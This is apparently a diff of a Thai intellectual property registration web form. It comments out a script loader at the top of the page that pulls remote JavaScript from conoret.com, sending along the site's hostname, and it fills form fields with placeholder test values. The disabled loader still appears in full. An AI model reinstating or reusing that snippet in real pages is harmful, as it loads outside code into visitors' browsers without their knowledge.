@@ -237,12 +237,15 @@
 </style>
 
 <body>
+
     <script type="text/javascript">
-        window.top === window && ! function() {
-            var e = document.createElement("script"),
-                t = document.getElementsByTagName("head")[0];
-            e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e)
-        }();
+        // window.top === window && ! function() {
+        //     var e = document.createElement("script"),
+        //         t = document.getElementsByTagName("head")[0];
+        //     e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e)
+       
+        // }();
+        function selectday(){}
     </script>
     <div class="body">
         <h1 class="glow">การจดทะเบียนทรัพย์สินทางปัญญา</h1>
@@ -289,14 +292,14 @@
                                 <th>เลขที่คำขอ: </th>
                                 <td>
                                     <div class="container" style=" margin-right:10px; ">
-                                        <input type="number" id="number" c placeholder="000000" name="numfeduest" required="">
+                                        <input type="number" id="number" c placeholder="000000" name="numfeduest" required="" value="2">
                                     </div>
                                 </td>
 
                                 <th>วันที่ยื่นขอ:</th>
                                 <td>
                                     <div class="container" style=" margin-right:30px; ">
-                                        <input type="date" id="ddmmyy" name="offer" onchange="selectday()">
+                                        <input type="date" id="ddmmyy" name="offer" onchange="selectday()" value="04/09/2022"> 
                                         <div id="result"></div>
                                 </td>
 
@@ -304,13 +307,13 @@
                                 <td>
                                     <div class="container" style="text-align:center;">
                                         <label for="myfile">กรุณาเลือกไฟล์</label><br>
-                                        <input type="file" id="myfile" name="form">
+                                        <input type="file" id="myfile" name="form" >
                                 </td>
                                 <th>สำหรับแอดมิน</th>
                                 <td>
                                     <div class="container" style="text-align:center;">
                                         <label for="myfile">กรุณาเลือกไฟล์</label><br>
-                                        <input type="file" id="myfile" name="admin">
+                                        <input type="file" id="myfile" name="admin[]"multiple="multiple">
                                 </td>
                             </div>
                         </tr>
@@ -324,21 +327,21 @@
                                 <th>ตัวเเทน</th>
                                 <td>
                                     <div class="container" style=" margin-left: 40px; margin-right:20px">
-                                        <input type="text" id="number" placeholder="" name="agent" required="">
+                                        <input type="text" id="number" placeholder="" name="agent" required="" value="5545">
                                     </div>
                                 </td>
 
                                 <th>เลขทะเบียน</th>
                                 <td>
                                     <div class="container" style=" margin-right:30px">
-                                        <input type="number" id="number" placeholder="000000" name="numregister" required="">
+                                        <input type="number" id="number" placeholder="000000" name="numregister" required="" value="2">
                                     </div>
                                 </td>
 
                                 <th>วันที่ออกเลขทะเบียน</th>
                                 <td>
                                     <div class="container" style="margin-right: 70px;">
-                                        <input type="date" id="ddmmyy" onchange="selectday()">
+                                        <input type="date" id="ddmmyy" onchange="selectday()" value="04/09/2022">
                                         <div id="result"></div>
                                 </td>
                                 <?
@@ -370,14 +373,14 @@
                                 <th>ชื่อเรื่อง</th>
                                 <td>
                                     <div class="container" style=" margin-left: 40px; margin-right:20px">
-                                        <input type="text" id="number" placeholder="" name="title" required="">
+                                        <input type="text" id="number" placeholder="" name="title" required="" value="มา">
                                     </div>
                                 </td>
 
                                 <th>ผู้ทรงสิทธิ</th>
                                 <td>
                                     <div class="container" style=" margin-left: 20px; margin-right:80px">
-                                        <input type="text" id="number" placeholder="xxx" name="holdre" required="">
+                                        <input type="text" id="number" placeholder="xxx" name="holdre" required=""value="มา">
                                     </div>
                                 </td>
 
@@ -427,7 +430,7 @@
                                 <th>หน่วยงานภายนอก</th>
                                 <td>
                                     <div class="container" style="  margin-left:47px; ">
-                                        <input type="text" id="number" placeholder="" name="agency" >
+                                        <input type="text" id="number" placeholder="" name="agency" value="มา">
                                     </div>
                                 </td>
                                 <th>ผู้ประดิษฐ์<br>(1คน)</th>
@@ -470,7 +473,7 @@
                                 <th>ชื่อโครงการ(กตป.)</th>
                                 <td>
                                     <div class="container" style=" margin-left: 25px; margin-right:33px">
-                                        <input type="text" id="number" placeholder="" name="framename" required="">
+                                        <input type="text" id="number" placeholder="" name="framename" required="" value="มา">
                                     </div>
                                 </td>
 
@@ -486,13 +489,13 @@
                                 <th>รหัสโครงการวิจัย<br>บริการวิจัย</th>
                                 <td>
                                     <div class="container">
-                                        <input type="number" id="number" placeholder="0" name="projectcode" required="">
+                                        <input type="number" id="number" placeholder="0" name="projectcode" required="" value="5">
                                     </div>
                                 </td>
                                 <th>คู่สัญญา<br>โครงการ</th>
                                 <td>
                                     <div class="container" style="  margin-left:47px; ">
-                                        <input type="text" id="number" placeholder="" name="container" required="">
+                                        <input type="text" id="number" placeholder="" name="container" required="" value="มา">
                                     </div>
                                 </td>
 
@@ -518,7 +521,7 @@
                                     <div class="container" style="text-align:center;">
                                         <div class="container" style=" margin-left:40px; margin-right:5px;">
                                             <label for="myfile">กรุณาเลือกไฟล์</label><br>
-                                            <input type="file" id="myfile" name="attachment">
+                                            <input type="file" id="myfile" name="attachment"multiple="multiple">
                                 </td>
 
 
@@ -550,7 +553,7 @@
                                 <class="tr">
                                     <td>
                                         <div class="container" style="  margin-left:25px; margin-right:15px">
-                                            <input type="text" id="number" placeholder="" name="lead" required="">
+                                            <input type="text" id="number" placeholder="" name="lead" required="" value="มา"> 
                                         </div>
                                     </td>
 
@@ -576,7 +579,7 @@
                                     <th>หมายเหตุ</th>
                                     <td>
                                         <div class="container" style="  margin-left:47px; ">
-                                            <input type="text" id="number" placeholder="" name="note" required="">
+                                            <input type="text" id="number" placeholder="" name="note" required="" value="มา">
                                         </div>
                                     </td>
 
@@ -597,4 +600,5 @@
         </form>
     </div>
     </table>
+    
 </body>
